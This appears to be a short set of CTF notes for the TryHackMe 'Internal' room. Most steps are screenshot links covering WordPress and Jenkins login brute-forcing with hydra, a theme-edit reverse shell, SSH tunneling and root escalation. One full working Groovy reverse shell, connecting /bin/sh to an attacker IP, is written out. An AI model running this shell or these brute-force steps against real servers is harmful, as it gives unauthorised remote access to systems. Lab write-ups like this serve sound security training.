# notes  for internal hard ctf thm 

## recon : 
![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/b3083cbd-95e2-4ab1-a1c3-d088cddb771f)

## enumerating :

![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/41a6f84b-1982-410f-8eb7-12fed72a297a)

## brute force the login page to get admin cred using wpscan or hydra because the admin is valid username!

![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/a47fe8c1-a6d8-4e07-9435-d607d306e4f5)

![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/13e530ad-f66b-4c41-a873-21b7a95bd61c)

![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/3913d412-8709-4888-a1e4-ece0cbac11e6)



## getting reverse shell after editing the theme by changing 404.php file 


##  manual enumerating after getting an escalated priv to the machine :



## ssh tunneling to Privilage escelation:

in the attacker machine :
![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/80eacedf-c6a9-410c-a2d4-80248e60c31a)
![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/ce2a1793-8e04-459c-a553-115d77f8f4d8)


## trying to loging to jenkinks service :

![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/d136a034-b64a-4ef7-8b33-206b3bdcdd1f)

- use burp suite to get the parameters ready for hydra :
- 
  ![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/6c382504-6eac-4470-aa2c-603b73bd35e2)

- using hydra to login :
  ![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/42c5e395-fc3e-4dd2-bd18-ab909fba4602)
  ![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/a4ab5947-7945-4ba1-9bdf-b1d3e9516c89)

  - we could use OWSAP ZAP tool to fuzz it and check respondes that has different size and those make this as relevent passwords to try and than try with diff usernames
  - but admin is default user in jenkins so we tried it first
 
## now lets make reverse shell as we did in the wp website  using groovy script :

String host="10.9.149.158";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/979f076d-abb9-4ac2-9cd4-f949993d67bc)

PE  to root :
![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/3d89a279-7245-4ad6-a910-8b3465920bb3)
![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/dfca5acc-ad90-472c-95ee-70e65305512c)







